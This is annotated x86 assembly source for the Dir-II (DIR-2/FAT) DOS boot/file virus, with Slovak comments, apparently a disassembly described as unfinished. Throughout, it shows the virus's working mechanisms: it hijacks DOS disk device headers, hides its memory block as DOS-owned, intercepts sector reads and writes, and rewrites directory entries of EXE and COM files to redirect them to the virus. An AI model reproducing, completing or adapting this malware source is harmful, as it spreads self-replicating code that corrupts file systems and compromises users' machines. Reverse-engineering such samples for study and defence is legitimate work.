

; ----------------------------------------------------------------------------
;	Virus Dir-2/FAT			(c) 1991  Sourced by Roman_S
;
;  Nedopracovany zdrojovy kod ....
; ----------------------------------------------------------------------------

my_size		equ	60h			;60 paragrafov (1536 byte) mem
data_1e		equ	16h			; (0000:0016=0F000h)
vector_30	equ	0C1h			;Interrupt 30h
data_2e		equ	465h			; (0273:0465=0)
MCB_size	equ	3			;MCB size alocation blok
MCB_owner	equ	1			;MCB owner for this mem blok
data_4e		equ	16h			; (8383:0016=0)
DOS_env		equ	2Ch			;Segment addres of DOS environ.
data_13e	equ	5FCh			; (8383:05FC=0)
top_stack	equ	600h			;Pre nastavenie vrcholu zasob.

dir_2		segment	byte public
		assume	cs:dir_2, ds:dir_2

		org	100h
start:

; Nastavenie zasobnika na offset 600h, vlozenie adresy INT 21h (Push)
; Vsetky volania DOSu su realizovane rutinou int_21, ktora vola DOS
; prostrednictvom hodnot zo zasobnika. 
; ( Adresa INT 21h je ziskana z nedokumentovanej tabulky DOS (int 30) )
;
		mov	sp,top_stack		;Set stack
                inc     word ptr dev_header+2
;		xor	cx,cx                   ;CX = 0
		db 	31h,0C9h		;Instruction of previous line
		mov	ds,cx			;DS = 0
		lds	ax,dword ptr ds:vector_30  ;DS:AX  - DOS called tab
		add	ax,21h			   ;Seek to interrupt 21h
		push	ds			   ;Push this address
		push	ax
; Testovanie verzie DOSu, zmensenie memory bloku alokovaneho EXECom na
; velkost 1536 byte, zistenie adresy prveho MCB bloku a adresy DPB.
;
		mov	ah,30h			;Get DOS version
		call	int_21			;Call DOS prostr. stacku
		cmp	al,4			;Major version number = 4
;		sbb	si,si			;SI = FFFFh if no 
		db	19h,0F6h		;Instructions of previous line
		mov	byte ptr ds:[locate+2],0FFh ;Cislo zariadenia (init)
		mov	bx,my_size		;Set memory blok
		mov	ah,4Ah			;Shrink memory block
		call	int_21
		mov	ah,52h			;Get DOS variables (ES:BX)
		call	int_21
		push	word ptr es:[bx-2]	;Push segment of First MCB
		lds	bx,dword ptr es:[bx]	;DS:BX = First Disk Param.Block

; Modifikacia vsetkych DPB ktore sa nachadzaju na segm. 70h (Dosovske)
; Virus nastavi device header na seba a acces flag na - nepristupny driver ???
;
next_DPB:	mov	ax,[bx+si+15h]		;AX = segment of device header
		cmp	ax,70h
		jne	no_modif		;Nemodifikuj ine ako DOSovske
		xchg	ax,cx			  ;Zamen AX & CX (CX=Segm. DPB)
		mov	byte ptr [bx+si+18h],0FFh ;Set acces flag (Not accesed)
		mov	di,[bx+si+13h]		  ;DI = offset of device header
		mov	word ptr [bx+si+13h],offset dev_header ;New device header
		mov	[bx+si+15h],cs		  ;Set segm. new device header
no_modif:	lds	bx,dword ptr [bx+si+19h]  ;DS:BX = next Disk par block
		cmp	bx,0FFFFh		  ;This DPB is Last DPB ?
		jne	next_DPB		;Continue to next Disk Block
		jcxz	terminate		;Terminate exit if segment DPB=0

; K adrese prveho MCB prida jeho dlzku => ma adresu nasledujuceho MCB
; Ak to je nas segment (blok) zvacsi ho o svoju velkost+1 paragr.
;
		pop	ds			;Restore segment of first MCB
		mov	ax,ds
		add	ax,ds:MCB_size		;AX = first MCB + lenght MCB +1
		inc	ax
		mov	dx,cs
		dec	dx			;DX = MCB for my program
;		cmp	ax,dx			;Sme my druhy MCB v poradi ?
		db	39h,0D0h		;Instr. of previous line
		jne	no_equal
		add	word ptr ds:MCB_size,my_size+1 ;Zvacsi o moju dlzku

; Nastavim vlastnika memory bloku na 8 <dos>,
; Nastavim skoky do povodneho disk device headera (Interrupt, strategy routine)
;
no_equal:	mov	ds,dx			  ;DS = segment for my MCB
		mov	word ptr ds:[MCB_owner],8 ;Set memory owner to 8 <dos>
		mov	ds,cx
		les	ax,dword ptr [di+6]	;ES,AX=offsety interrupt,strategy
		mov	word ptr cs:[original_dev+1],ax 	;routinne
		mov	word ptr cs:[original_dev+6],es	;Nastav svoje skoky

; Virus hlada v DOS disk headeri jeden Far Call [....]
		cld				;Clear direction
		mov	si,1			;DS:SI-1 byte segmentu 70h (DOS)
find_cont:	dec	si
		lodsw				;Hladaj v headeri 1EFFh kod
		cmp	ax,1EFFh		;        Call cs:far [xxxx]
		jne	find_cont
		mov	ax,02CAh		;Nasleduje Retf 02 ?
		cmp	[si+4],ax
		je	find_ok
		cmp	[si+5],ax		;Ze by az o byte dalej ?
		jne	find_cont		;Ak nie tak to bol omyl -> znova

; Far Call [....] bol uspesne lokalizovany a SI ukazuje na hodnotu tohto Call
find_ok:	lodsw				;AX = hodnota tohto Call volania
		push	cs
		pop	es			;Set ES to my segment
		mov	di,offset origin_call+1	
		stosw				;Nastav natvrdo v kode tuto hodn.
		xchg	ax,si			;SI = nase call volanie ????
		mov	di,5F8h			;Niekde na stack ???
                cli                             ;Zakaz interrupt
                movsw                           ;Mov [si] to es:[di]
                movsw                           ;Mov [si] to es:[di]

		mov	dx,0C000h		;Set DX to video ROM
loc_5:          mov     ds,dx
;               xor     si,si			;SI = 0
		db      31h,0F6h		;Instr. of previous line
                lodsw				;Prve 2 byte Video ROM
		cmp	ax,0AA55h		;Signature VGA BIOS ?
                jne     loc_9
                cbw                             ;Convert byte to word
                lodsb
		mov	cl,9
                shl     ax,cl                   ;Rotate 9x

loc_6:		cmp	word ptr [si],6C7h
                jne     loc_8
		cmp	word ptr [si+2],4Ch
                jne     loc_8
		push	dx			;Push C000h
		push	word ptr [si+4]
                jmp     short loc_10

terminate:	int     20h                     ;Program Terminate
		db	'c:',0ffh,0		;???

loc_8:		inc	si
;		cmp	si,ax
                db      39h,0C6h                ;Original byte of prev. instr
		jb	loc_6
loc_9:
		inc	dx
		cmp	dh,0F0h
		jb	loc_5
		sub	sp,4

loc_10:		push	cs
		pop	ds			;Set DS to my segment
		mov	bx,ds:DOS_env		;Segment address of DOS envir.
		mov	es,bx
		mov	ah,49h			;Free alocate memory block
		call	int_21
;		xor	ax,ax			;AX = 0
                db      31h,0C0h                ;Instr. of prev line
		test	bx,bx
		jz	loc_12			;Jump if envir address = 0
		mov	di,1

hladaj:		dec	di			;For byte offset
		scasw				;Scan es:[di] for 0000h
		jnz	hladaj
		lea	si,[di+2]		;SI = hodnota DI + 2
		jmp	short obskok

loc_12:		mov	es,ds:data_4e		; (8383:0016=0)
		mov	bx,es:data_1e		; (0000:0016=0F000h)
		dec	bx
;		xor	si,si			; Zero register
                db      31h,0F6h                ;Instr. of prev. line

obskok:		push	bx
		mov	bx,4F4h
		mov	[bx+4],cs
		mov	[bx+8],cs
		mov	[bx+0Ch],cs
		pop	ds
		push	cs
		pop	es
		mov	di,522h
		push	di
		mov	cx,28h
		rep	movsw
		push	cs
		pop	ds
                mov     ah,3Dh                  ;Open file
		mov	dx,1CFh
                call    int_21
		pop	dx
                mov     ax,4B00h                ;Exec DS:DX infect file
                call    int_21
                mov     ah,4Dh                  ;Get program exit code to AL
                call    int_21
                mov     ah,4Ch                  ;Terminate programm virus
  
;-----------------------------------------------------------------------
;	Volanie INT 21h cez tabulku INT 30 s stack
;-----------------------------------------------------------------------
int_21		proc	near
                pushf                           	;Emulate interrupt
                call    dword ptr cs:[top_stack-4]	;Call DOS interrupt
		retn
int_21		endp

; ----------------------------------------------------------------------  
;	Zatial nezistene - sub_3 sem nastavuje jedno volnanie
;
neznama:	mov	ah,3
		jmp	dword ptr cs:[05f8h]

; ---------------------------------------------------------------------
;	Strategy routine for Device header layout
; ---------------------------------------------------------------------
strategy_fun:   push    ax		;Backup registers AX,CX,DX,SI,DI
		push	cx
		push	dx
		push	ds
		push	si
		push	di
		push	es		;Set DS=ES
		pop	ds
		mov	al,[bx+2]	;AL = command code of dev.request header
		cmp	al,4		;Input - read from device ?
                je      read_dev
                cmp     al,8		;Output - write to device ?
		je	write_dev
		cmp	al,9		;Output with verify ?
		je	write_dev
		call	original_dev
		cmp	al,2		;Bol povel na vratenie sektora FAT (Build BPB)
		jne	odchod		;Ak nie odchod
		lds	si,dword ptr [bx+12h] ;DS:SI-addres of BPB (FAT) for this disk
		mov	di,502h		      ;
		mov	es:[bx+12h],di	      ;Nastav novu tabulku FAT
		mov	es:[bx+14h],cs
		push	es		;Backup ES and ES=CS
		push	cs
		pop	es
		mov	cx,10h		;20h byte
		rep	movsw		;Copy first 32 byte of original FAT
		pop	es		;Restore ES and DS=CS
		push	cs
		pop	ds
		mov	al,[di-1Eh]
		cmp	al,2
		adc	al,0
		cbw				;Convrt byte to word
		cmp	word ptr [di-18h],0
		je	loc_14			;Jump if zero
		sub	[di-18h],ax
		jmp	short odchod

loc_14:		sub	[di-0Bh],ax
		sbb	word ptr [di-9],0

odchod:		pop	di			;Restore registers
		pop	si
		pop	ds
		pop	dx
		pop	cx
		pop	ax
interrpt_fun:	retf				;Return far

; --------------------------------------------------------------------
;	Command Write to device
; --------------------------------------------------------------------
write_dev:	mov	cx,0FF09h
		call	test_vymeny		;Testovanie vymeny media
		jz	nemenene_write
		call	original_dev
		jmp	short loc_21
nemenene_write:	jmp	cont_write

; --------------
nemenene_read:	jmp	loc_32			;Medium nebolo vymenene
loc_19:		add	sp,10h
		jmp	short odchod

; --------------------------------------------------------------------
;	Command Read from device
; --------------------------------------------------------------------
read_dev:       call    test_vymeny		;Testuj ci bolo vymenene medium
		jz	nemenene_read		;Jump if medium nevymenene
loc_21:		mov	byte ptr [bx+2],4	;Command code - read from device
		cld				;Clear direction
		lea	si,[bx+0Eh]		;SI = address of data buffer
		mov	cx,8			;8 x word -> 16 byte
  next_word:	lodsw				;Push 16 byte from data buffer
		push	ax
		loop	next_word

		mov	word ptr [bx+14h],1	;Cislo pociatocneho sektora
		call	read_sector1
		jnz	loc_19			;Jump if error
		mov	byte ptr [bx+2],2	;Command Build BPB
		call	original_dev		;Vykonaj command
		lds	si,dword ptr [bx+12h]	;DS:SI - adresa na fat tabulku
		mov	ax,[si+6]		;Vyber z FAT ?
		add	ax,0Fh
		mov	cl,4
		shr	ax,cl			;
		mov	di,[si+0Bh]
;		add	di,di
                db      01,0FFh                 ;Instr.of prev. line
		stc				;C=1
;		adc	di,ax
                db      11h,0C7h                ;Instr. of prev.line
		push	di			;Backup
		cwd				;DX filled with bit-15 of AX
		mov	ax,[si+8]
		test	ax,ax
		jnz	loc_23			; Jump if not zero
		mov	ax,[si+15h]
		mov	dx,[si+17h]

loc_23:
;		xor	cx,cx			;CX = 0
                db      31h,0C9h                ;Original byte prev. line
;		sub	ax,di
                db      29h,0F8h                ;Original byte prev. line
;		sbb	dx,cx
                db      19h,0CAh                ;Original byte prev. line
		mov	cl,[si+2]
		div	cx			; ax,dx rem=dx:ax/reg
		cmp	cl,2
		sbb	ax,0FFFFh
		push	ax
		call	sub_6
		mov	byte ptr es:[bx+2],4
		mov	es:[bx+14h],ax
		call	read_sector1

loc_24:		lds	si,dword ptr es:[bx+0Eh]	;Load 32 bit ptr
;		add	si,dx
                db      01,0D6h                 ;Original byte prev. line
;		sub	dh,cl
                db      28h,0CEh                ;Original byte prev.line
;		adc	dx,ax
                db      11h,0C2h                ;Original byte prev. line
		mov	word ptr cs:[43Fh],dx	; (8383:043F=3EBh)
		cmp	cl,1
		je	loc_26			; Jump if equal
		mov	ax,[si]
;		and	ax,di
                db      21h,0F8h                ;Instr. of prev. line
		cmp	ax,0FFF7h
		je	loc_25			; Jump if equal
		cmp	ax,0FF7h
		je	loc_25			; Jump if equal
		cmp	ax,0FF70h
		jne	loc_28			; Jump if not equal

loc_25:		pop	ax
		dec	ax
		push	ax
		call	sub_6
		jmp	short loc_24

loc_26:		not	di
		and	[si],di
		pop	ax
		push	ax
		inc	ax
		push	ax
		mov	dx,0Fh
		test	dx,di
		jz	loc_27			; Jump if zero
		inc	dx
		mul	dx			; dx:ax = reg * ax

loc_27:		or	[si],ax
		pop	ax
		call	sub_6
		mov	si,es:[bx+0Eh]
;		add	si,dx
                db      01,0D6h                 ;Instr. of prev. line
		mov	ax,[si]
;		and	ax,di
                db      21h,0F8h                ;Instr. of prev. line

loc_28:		mov	dx,di
		dec	dx
;		and	dx,di
                db      21h,0FAh                ;Instr. of prev. line
		not	di
		and	[si],di
		or	[si],dx
;		cmp	ax,dx
                db      39h,0D0h                ;Instr. of prev. line
		pop	ax
		pop	di
		mov	word ptr cs:[434h],ax
		jz	loc_30			; Jump if zero
		mov	dx,[si]
		push	ds
		push	si
		call	sub_3
		pop	si
		pop	ds
		jnz	loc_30			; Jump if not zero
		call	read_sector1
		cmp	[si],dx
		jne	loc_30			; Jump if not equal
		dec	ax
		dec	ax
		mul	cx			; dx:ax = reg * ax
;		add	ax,di
                db      01,0F8h                 ;Instr. of prev. line
		adc	dx,0
		push	es
		pop	ds
		mov	word ptr [bx+12h],2
		mov	[bx+14h],ax
		test	dx,dx
		jz	loc_29			; Jump if zero
		mov	word ptr [bx+14h],0FFFFh
		mov	[bx+1Ah],ax
		mov	[bx+1Ch],dx

loc_29:		mov	[bx+10h],cs
		mov	word ptr [bx+0Eh],100h
		call	sub_3

loc_30:		std				; Set direction flag
		lea	di,[bx+1Ch]		; Load effective addr
		mov	cx,8

locloop_31:	pop	ax
		stosw				;Store ax to es:[di]
		loop	locloop_31		;Loop if cx > 0

loc_32:		call	original_dev
		mov	cx,9


; --------------------------------------------------------------------------
; Skok sem je prevedneny ak nedoslo k zmene media hned na zaciatku write_dev
;
cont_write:	mov	di,es:[bx+12h]		;DI - sector counter
		lds	si,dword ptr es:[bx+0Eh] ;DS:SI - address of data buffer
		shl	di,cl
;		xor	cl,cl			;CL = 0
		db      30h,0C9h                ;Original byte prev. line
;		add	di,si
		db      01h,0F7h                ;Original byte
;		xor	dl,dl			;DL = 0
		db      30h,0D2h                ;Original byte prev. line
		push	ds			;Backup DS,SI
		push	si
		call	sub_1
		jcxz	loc_34			;Jump if cx=0
		call	sub_3
		and	byte ptr es:[bx+4],7Fh

loc_34:		pop	si			;Restore SI,DS
		pop	ds
		inc	dx
		call	sub_1
		jmp	odchod
  
; -----------------------------------------------------------------------
;			       SUBROUTINE
; -----------------------------------------------------------------------  
sub_1:		mov	ax,[si+8]
		cmp	ax,5845h
		jne	loc_36
		cmp	[si+0Ah],al
		je	loc_37

loc_36:		cmp	ax,4F43h
		jne	locloop_39
		cmp	byte ptr [si+0Ah],4Dh	; 'M'
		jne	locloop_39

loc_37:		test	word ptr [si+1Eh],0FFC0h
		jnz	locloop_39
		test	word ptr [si+1Dh],3FF8h
		jz	locloop_39
		test	byte ptr [si+0Bh],1Ch
		jnz	locloop_39
		test	dl,dl
		jnz	loc_38
		mov	ax,943h
		cmp	ax,[si+1Ah]
		je	locloop_39
		xchg	ax,[si+1Ah]
		xor	ax,3EBh
		mov	[si+14h],ax
		loop	locloop_39		;Loop if cx > 0
  
loc_38:
;		xor	ax,ax			; Zero register
                db      31h,0C0h                ;Original byte prev. line
		xchg	ax,[si+14h]
		xor	ax,word ptr cs:[43Fh]
		mov	[si+1Ah],ax

locloop_39:	rol	word ptr cs:[43Fh],1	;Rotate
		add	si,20h
;		cmp	di,si
                db      39h,0F7h                ;Original byte prev. line
		jne	sub_1
		retn


; ---------------------------------------------------------------------------
;  Test vymeny media (zmena zariadenia), vracia ZF=0 ak bolo medium vymenene
; ---------------------------------------------------------------------------
test_vymeny	proc	near
		mov	ah,[bx+1]		;AH = cislo zariadenia (unit)
locate:		cmp	ah,0			;Unit number = ???
		mov	byte ptr cs:[offset locate+2],ah ;Zamen nulu previous line
		jnz	return			;Return ZF = 0
		push	word ptr [bx+0Eh]	;Backup offset data buffer
		mov	byte ptr [bx+2],1	;Command media check (vymena ?)
		call	original_dev		;Original device routine
		cmp	byte ptr [bx+0Eh],1	;1 = nevymenene medium ?
		pop	word ptr [bx+0Eh]	;Restore offset data buffer
		mov	[bx+2],al		;Set command code to ???
return:		retn
test_vymeny	endp


; -------------------------------------------------------------------------
; Tato rutina prestavuje v povodnom headeri jeden call na seba,
; vola tento zmeneny header a obnovi co prestavila
; Adresu tohto Call jej sem poukne inicializacna rutina vira (origin_call)
; -------------------------------------------------------------------------
sub_3:		cmp	byte ptr es:[bx+2],8
		jae	original_dev		;Jump if above or =
		mov	byte ptr es:[bx+2],4

		mov	si,70h			;Adresa povodneho Disk headra
		mov	ds,si			;Nastav tento segment
origin_call:	mov	si,0B4h			;Tu bola dosadena adresa skoku
						;pri inicializacii vira
		push	word ptr [si]		;Push skok low word
		push	word ptr [si+2]		;Push skok hi  word
		mov	word ptr [si],offset neznama ;Prestav na seba ??????
		mov	[si+2],cs		; Aj segment
		call	original_dev		;Volaj original header
		pop	word ptr [si+2]		;Rekonstruuj povodny skok
		pop	word ptr [si]
		retn

; ----------------------------------------------------------------------
;	Volanie povodnej rutiny Device header
; Vracia ZF = 0 - nastala chyba
;	 ZF = 1 - nenastala chyba
; ----------------------------------------------------------------------
read_sector1:	mov	word ptr es:[bx+12h],1		;Pocitadlo sectorov =1
original_dev:
;		call	far ptr 0000
		db	9Ah, 0DCh, 5, 70h, 0
;		call	far ptr 0000
		db	9Ah, 83h, 83h, 70h, 0
		test	byte ptr es:[bx+4],80h		;Test device error
		retn

; -----------------------------------------------------------------------
;			       SUBROUTINE
; -----------------------------------------------------------------------
sub_6:          cmp     ax,0FF0h
		jae	loc_42			; Jump if above or =
		mov	si,3
		xor	word ptr cs:[43Dh][si],si	; (8383:043D=351Ah)
		mul	si			; dx:ax = reg * ax
		shr	ax,1			; Shift w/zeros fill
		mov	di,0FFFh
		jnc	loc_43			; Jump if carry=0
		mov	di,0FFF0h
		jmp	short loc_43		; (04E4)
loc_42:
		mov	si,2
		mul	si			; dx:ax = reg * ax
		mov	di,0FFFFh
loc_43:
		mov	si,200h
		div	si			; ax,dx rem=dx:ax/reg

; ------------------------------------------------------------------------
;	Predefinovane DEVICE HEADERs
;
dev_header      db      40h,0c3h,41h,0h		;Far address of next device
		dw	0842h			;Device attribute
		dw	offset strategy_fun	;Strategy routine
		dw	offset interrpt_fun	;Interrupt routine
						;Device name (size 8)
		db	7Fh,0,0,80h,0,83h,83h,5Ch
		db	0,83h,83h,6Ch,0
  
dir_2		ends
		end	start
</dos></dos>